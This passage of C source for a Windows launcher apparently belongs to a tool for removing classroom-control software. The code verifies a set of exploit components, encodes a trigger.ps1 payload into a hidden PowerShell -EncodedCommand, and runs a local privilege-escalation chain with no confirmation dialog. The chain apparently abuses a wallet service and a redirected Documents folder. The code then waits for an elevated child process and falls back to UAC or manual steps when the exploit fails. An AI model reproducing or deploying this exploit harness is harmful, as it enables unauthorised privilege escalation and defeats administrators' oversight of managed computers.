    if (wide) free(wide);
    free(script);
    return b64;
}

static int g_lpeChildAbandoned;   /* the spawned child gave up (canceled UAC) */

static int TryLpe(const char* cmdline)
{
    static const char* pieces[] = {
        LPE_TRIGGER,
        "lpe\\wallet_ese_seed.exe",
        "lpe\\wallet_callback_shell.dll",
        "lpe\\documents_path.exe",
        "lpe\\shell_broker.exe"
    };
    char    dir[MAX_PATH], script[MAX_PATH], hookLog[MAX_PATH], ps[MAX_PATH];
    /* Static only to stay off the stack: TryLpe runs on the WinMain thread and
       nothing else in this process touches these buffers. */
    static char cmd[LPE_CMDLINE_MAX], target[2048];
    char    exe[MAX_PATH];
    char    abortPath[MAX_PATH];
    HANDLE  proc = NULL, job = NULL;
    DWORD   t0, lastBeat, exitCode = 0, pid = 0, exitTick = 0, got, skipTick = 0;
    int     ok = 0, skipped = 0, i, n, stillRunning = 0;

    if (!ExeDir(dir, sizeof(dir))) return 0;

    /* Fail fast (and say what is missing) instead of letting PowerShell die
       for an unrelated reason 40 seconds later. */
    for (i = 0; i < (int)(sizeof(pieces) / sizeof(pieces[0])); i++) {
        char p[MAX_PATH];
        if (!Join(p, sizeof(p), dir, pieces[i])) {
            ELog("lpe: path too long: %s", pieces[i]);
            return 0;
        }
        if (!FileExists(p)) {
            ELog("lpe: missing %s - skipped", p);
            return 0;
        }
    }

    if (!Join(script, sizeof(script), dir, LPE_TRIGGER) ||
        !Join(hookLog, sizeof(hookLog), dir, ELEVATE_LOG))
        return 0;

    /* cmdline is spliced into a command line verbatim.  A stray quote re-splits
       it, and then --elevate=uac is no longer the last argument - it is the
       only thing that stops a non-admin child from looping back into TryLpe. */
    if (cmdline && strchr(cmdline, '"')) {
        ELog("lpe: refusing to forward a cmdline containing a quote: %s", cmdline);
        return 0;
    }

    got = GetModuleFileNameA(NULL, exe, sizeof(exe));
    if (got == 0 || got >= sizeof(exe)) {
        ELog("lpe: own path does not fit in %u bytes", (unsigned)sizeof(exe));
        return 0;
    }

    /* --elevate=uac at the end: if the spawned instance somehow is NOT admin
       (token tricks failed), it goes straight to the UAC prompt instead of
       re-running this LPE (which would loop).  An admin instance never parses
       it - WinMain only calls Elevate_Boot when IsUserAnAdmin() is false. */
    n = _snprintf(target, sizeof(target), "\"%s\" %s --elevate=uac",
                  exe, (cmdline && *cmdline) ? cmdline : "");
    if (n < 0 || n >= (int)sizeof(target)) {
        ELog("lpe: child command line too long (%d bytes, max %u) - not "
             "starting it with a truncated --elevate=uac",
             n, (unsigned)sizeof(target) - 1);
        return 0;
    }

    if (!FindPowerShell(ps, sizeof(ps))) {
        ELog("lpe: powershell.exe not found");
        return 0;
    }

    {
        char  repo[MAX_PATH];
        char* enc;

        if (!Join(repo, sizeof(repo), dir, "lpe")) return 0;
        enc = BuildEncodedCommand(script, repo, target, GetCurrentProcessId());
        if (!enc) {
            ELog("lpe: cannot read/encode %s", script);
            return 0;
        }
        /* The script becomes UTF-16, then Base64 (4/3 of that), so the command
           line grows ~2.7x.  With a 9.2 KB script that is ~25 KB, leaving room
           for the script to reach ~12 KB before CreateProcessA refuses; past
           that the exe must grow (or the payload must move out of -EncodedCommand). */
        n = _snprintf(cmd, sizeof(cmd),
                      "\"%s\" -NoLogo -NoProfile -NonInteractive -EncodedCommand %s",
                      ps, enc);
        free(enc);
        if (n < 0 || n >= (int)sizeof(cmd)) {
            ELog("lpe: encoded command does not fit in %u bytes (%d needed) - "
                 "is the payload script too big?", (unsigned)sizeof(cmd), n);
            return 0;
        }
    }

    ELog("lpe: payload %s (encoded command)", script);

    /* Both prepared before the script starts: the abort file so that a stale
       one (same pid, earlier run) cannot read as "the user already skipped",
       and the job so the script is inside it before it can spawn anything. */
    if (!SkipFilePath(abortPath, sizeof(abortPath), GetCurrentProcessId()))
        abortPath[0] = '\0';
    if (abortPath[0]) DeleteFileA(abortPath);
    job = CreateKillOnCloseJob();

    if (!RunHidden(cmd, hookLog, &proc, job)) {
        CloseJob(job);                  /* empty job: nothing inside to kill */
        return 0;
    }

    StatusSetText("正在自动提权…\r\n"
                  "钱包服务链路已经启动，正常需要 10~30 秒。\r\n"
                  "失败会自动切换到 UAC，不会卡在这里。");

    t0 = lastBeat = GetTickCount();
    for (;;) {
        int sr;

        if (g_swSkip && !skipped) {
            skipped = 1;
            skipTick = GetTickCount();
            if (abortPath[0] && WriteAbort(abortPath)) {
                ELog("lpe: user skipped, abort written, waiting up to %d ms for "
                     "trigger.ps1", LPE_SKIP_GRACE_MS);
            } else {
                ELog("lpe: user skipped, no abort file (%s) - waiting up to %d ms "
                     "anyway", abortPath[0] ? abortPath : "LOCALAPPDATA is not set",
                     LPE_SKIP_GRACE_MS);
            }
            LogLeftoverServices();
            StatusSetText("正在取消自动提权…\r\n"
                          "等脚本把 Documents 还原，最多 3 秒。");
        }

        if (skipped) {
            /* Semantics B: the script is the one that restores Documents, so
               wait for it to unwind through its finally instead of killing it
               on the spot.  Only a script that does not react gets killed. */
            if (WaitForSingleObject(proc, 0) != WAIT_TIMEOUT) {
                ELog("lpe: trigger.ps1 exited after %lu ms",
                     (unsigned long)(GetTickCount() - skipTick));
                break;
            }
            if (GetTickCount() - skipTick > LPE_SKIP_GRACE_MS) {
                ELog("lpe: trigger.ps1 did not exit in %d ms, terminating",
                     LPE_SKIP_GRACE_MS);
                TerminateProcess(proc, 1);
                WaitForSingleObject(proc, 1000);
                break;
            }
            Sleep(100);
            continue;
        }

        sr = ScanHookLogStatus(hookLog, &pid);
        if (sr == 2) {                  /* the child gave up: no admin coming */
            g_lpeChildAbandoned = 1;
            ELog("lpe: spawned child reported failure (abandon)");
            break;
        }
        if (sr == 1 && pid != GetCurrentProcessId()) {
            int st = ProcessState(pid);
            if (st != 0) { ok = 1; break; }   /* -1 = higher integrity: trust it */
        }
        if (!ok) {
            DWORD cpid = 0;
            if (ScanHookLogChildPid(hookLog, &cpid) && cpid != GetCurrentProcessId() &&
                ProcessState(cpid) != 0) {
                pid = cpid;
                ok = 1;
                ELog("lpe: handshake line not seen yet - log says child_pid=%lu "
                     "is alive, accepting it (it may still run its own UAC step)",
                     (unsigned long)cpid);
                break;
            }
        }

        stillRunning = 0;
        if (proc) {
            if (WaitForSingleObject(proc, 0) == WAIT_TIMEOUT) stillRunning = 1;
            else if (!exitTick) {
                DWORD code;
                exitTick = GetTickCount();
                /* On failure keep the previous value: a failed query leaving 0
                   would read as "success" and buy a 25 s grace for nothing. */
                if (GetExitCodeProcess(proc, &code)) exitCode = code;
            }
        }
        /* After the script ends: exit=0 means the chain SUCCEEDED and the
           spawned child may still be mid-UAC (the human has to click), so
           keep watching for its status.  Any failure exit is final and there
           is nothing to wait for. */
        if (!stillRunning && exitTick) {
            DWORD grace = (exitCode == 0) ? 25000 : 2500;
            if (GetTickCount() - exitTick > grace) break;
        }
        if (GetTickCount() - t0 > 60000) break;

        if (GetTickCount() - lastBeat > 10000) {
            lastBeat = GetTickCount();
            ELog("lpe: still waiting (%lu s, script %s)",
                 (unsigned long)((GetTickCount() - t0) / 1000),
                 stillRunning ? "running" : "finished");
        }
        Sleep(200);
    }

    if (proc) {
        DWORD code;

        if (GetExitCodeProcess(proc, &code)) exitCode = code;
        /* The skip path already waited (and terminated if it had to).  A script
           still running 55 s in is not going to produce an admin instance, so
           stop it - the finally has had every chance by then. */
        if (!ok && !skipped && exitCode == STILL_ACTIVE &&
            GetTickCount() - t0 > 55000) {
            ELog("lpe: script still running after %lu s, terminating",
                 (unsigned long)((GetTickCount() - t0) / 1000));
            TerminateProcess(proc, 1);
        }
        CloseHandle(proc);
    }
    /* No wait for the script here on purpose: CloseJob disarms kill-on-close
       first, so a still-running trigger.ps1 keeps running its finally after we
       close the handle.  Waiting would only stall the UI (and the success path
       breaks out of the loop while the script is normally mid-finally). */
    CloseJob(job);

    /* The writer is also the only deleter (trigger.ps1 never removes it), and
       the pid-named file would otherwise sit in %LOCALAPPDATA% forever. */
    if (abortPath[0]) DeleteFileA(abortPath);

    if (ok) {
        ELog("lpe: elevated instance pid=%lu is running", (unsigned long)pid);
        StatusSetText("自动提权成功，正在启动…");
    } else if (skipped) {
        ELog("lpe: skipped by the user");
        StatusSetText("已跳过自动提权，正在切换到 UAC…");
    } else {
        /* payload stdout/stderr already stream into the shared log, so the
           failure reason is up there - just mark the summary. */
        ELog("lpe: no elevated instance (script exit=%lu, %lu s%s) - "
             "see the payload lines above",
             (unsigned long)exitCode,
             (unsigned long)((GetTickCount() - t0) / 1000),
             g_lpeChildAbandoned ? ", child gave up" : "");
        StatusSetText("自动提权没有成功，正在切换到 UAC…");
    }
    return ok;
}

static int ManualPrompt(HWND owner, const char* cmdline, int silent)
{
    if (silent) return 0;
    for (;;) {
        int r = MessageBoxW(owner,
                            L"自动提权失败，本程序需要管理员权限。\n\n"
                            L"请右键 bin\\bypass.exe ->「以管理员身份运行」。\n\n"
                            L"[重试] 再弹一次 UAC\n"
                            L"[取消] 退出本程序",
                            L"教学控制解除工具 - 需要管理员权限",
                            MB_ICONWARNING | MB_RETRYCANCEL);
        if (r != IDRETRY) return 0;
        ELog("manual: user chose retry");
        if (TryUac(cmdline, silent)) return 1;
    }
}

/* ---------------- public entry points ---------------- */

int Elevate_IsSpawnedChildCmd(const char* cmdline)
{
    return (cmdline && strstr(cmdline, "--elevate=uac") != NULL) ? 1 : 0;
}

/* A spawned child writes this marker line before giving up, so the launcher
   that is waiting in ScanHookLogStatus can fall back immediately instead of
   timing out (e.g. the user canceled the child's UAC prompt). */
static void Elevate_Abandon(void)
{
    ELog("ELEVATE_ABANDON pid=%lu - spawned child gave up, no admin instance coming",
         (unsigned long)GetCurrentProcessId());
}

int Elevate_Boot(HWND owner, const char* cmdline, int silent)
{
    int found = 0;
    int mode;
    int skippedLpe = 0;
    /* "--elevate=uac" is appended by the LPE broker: this instance was spawned
       by the chain, so keep the shared log intact and report a final failure
       back to the launcher. */
    int isChild = Elevate_IsSpawnedChildCmd(cmdline);

    /* Debug hook: dump the -EncodedCommand payload so it can be diffed against
       what PowerShell itself would produce.  Never starts anything; the blob
       goes to %TEMP% so bin\ stays clean. */
    if (cmdline && strstr(cmdline, "--elevate-selftest")) {
        char script[MAX_PATH], repo[MAX_PATH], temp[MAX_PATH], out[MAX_PATH];
        char* enc;
        FILE* f;

        if (!ExeSibling(script, sizeof(script), LPE_TRIGGER)) return 0;
        if (!ExeSibling(repo, sizeof(repo), "lpe")) return 0;
        {
            char target[2048], exe[MAX_PATH];
            GetModuleFileNameA(NULL, exe, sizeof(exe));
            _snprintf(target, sizeof(target) - 1, "\"%s\"", exe);
            target[sizeof(target) - 1] = '\0';
            enc = BuildEncodedCommand(script, repo, target, GetCurrentProcessId());
        }
        if (!enc) {
            ELog("selftest: cannot read/encode %s", script);
            return 0;
        }
        if (!GetTempPathA(sizeof(temp), temp)) temp[0] = '\0';
        _snprintf(out, sizeof(out) - 1, "%s%s", temp, ELEVATE_SELFTEST);
        out[sizeof(out) - 1] = '\0';
        f = fopen(out, "wb");
        if (f) { fwrite(enc, 1, strlen(enc), f); fclose(f); }
        ELog("selftest: encoded command (%lu bytes) -> %s",
             (unsigned long)strlen(enc), out);
        free(enc);
        return 0;
    }

    mode = CmdLineMode(cmdline, &found);
    if (!found) mode = Mode();

    /* Automation must not sit in an exploit attempt for a minute: silent mode
       only uses UAC unless --elevate=lpe was given explicitly. */
    if (silent && !found && mode == ELEVATE_LPE) {
        mode = ELEVATE_UAC;
        skippedLpe = 1;
    }

    if (!isChild) TruncateLog();
    ELog("launcher pid=%lu mode=%s%s%s (cmdline=%s)",
         (unsigned long)GetCurrentProcessId(), ModeName(mode),
         skippedLpe ? " [lpe skipped: silent]" : "",
         isChild ? " [spawned child]" : "",
         (cmdline && *cmdline) ? cmdline : "-");

    if (mode == ELEVATE_OFF) {
        ELog("elevation disabled by configuration");
        return 0;
    }

    /* No confirmation dialog on purpose: double-clicking the exe should just
       work.  mode=lpe runs the payload right away and silently falls back to
       UAC when it fails - that is exactly what the confirmation used to ask. */

    if (mode == ELEVATE_LPE) {
        int ok;
        if (!silent) StatusOpen();
        ok = TryLpe(cmdline);
        if (ok) {
            /* let the user see the success for a moment before the window
               disappears and the real UI comes up */
            if (!silent) Sleep(700);
            StatusClose();
            return 1;
        }
        if (!silent) {
            Sleep(900);            /* "switching to UAC" stays readable */
            StatusClose();
        }
        ELog("lpe failed - falling back to uac/manual");
    }

    /* If the LPE spawned a child and that child already failed in front of the
       user (its UAC prompt was canceled), popping yet another UAC here is
       pointless and confusing - go straight to the manual instructions. */
    if (g_lpeChildAbandoned) {
        ELog("child already asked the user - skipping the second UAC prompt");
    } else if (mode == ELEVATE_LPE || mode == ELEVATE_UAC) {
        if (TryUac(cmdline, silent)) return 1;
    }

    ELog("no elevated instance started - showing the manual instructions");
    if (ManualPrompt(owner, cmdline, silent)) return 1;
    if (isChild) Elevate_Abandon();
    return 0;
}

/* The handshake used to be a status file; now it is a log line.  The launcher
   scans bypass_hook.log for "elevated instance pid=" (see ScanHookLogStatus). */
void Elevate_NoteElevated(void)
{
    ELog("elevated instance pid=%lu is up", (unsigned long)GetCurrentProcessId());
}
